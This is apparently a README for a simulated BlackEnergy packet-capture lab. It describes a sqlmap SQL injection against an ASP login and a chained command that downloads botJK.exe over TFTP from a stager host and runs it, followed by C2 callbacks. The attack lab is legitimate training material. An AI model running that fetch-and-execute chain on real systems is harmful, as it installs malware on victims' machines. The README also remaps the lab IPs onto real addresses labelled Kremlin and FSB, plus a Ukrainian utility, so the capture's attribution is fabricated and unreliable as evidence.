READ ME Black Energy

Scenario

Attacker: Kali 192.168.91.130
Tool: Sql Map
Target: SQL Express 2005/XPSP2 192.168.91.142
Target Application: ASP
SQLi Vulnerable Parameter: txtPassword
Stager: 192.168.91.151 (TFTP Server)
Malicious binary: botJK.exe (Black Energy)
Black Energy C2: 192.168.4.140 

Attacker first probes target (142) by simply inserting ' into form, the proceeds to execute sqlmap against target from (130)
attacker successfuly SQLinjects target and executes command tftp -i GET 192.168.91.151 botJK.exe && botJK.exe. This command chained
is followed by out bound connection to Black Energy C2 (140). Then all you can see in the packet capture is the SQLi os shell from Kali and 
C2 call back to Black Energy C2.

Replaced IP adresses

192.168.91.130 —> 91.173.136.70 (Kremlin.RU) Attacker
192.168.91.142 -> 188.166.114.64 (http://e-in.com.ua/) Utility Company
192.168.91.151 —> 213.24.76.30 (FSB.ru) Stager server
192.168.91.140 —> 213.24.76.35 (FSB.ru) BlackEnergy C2
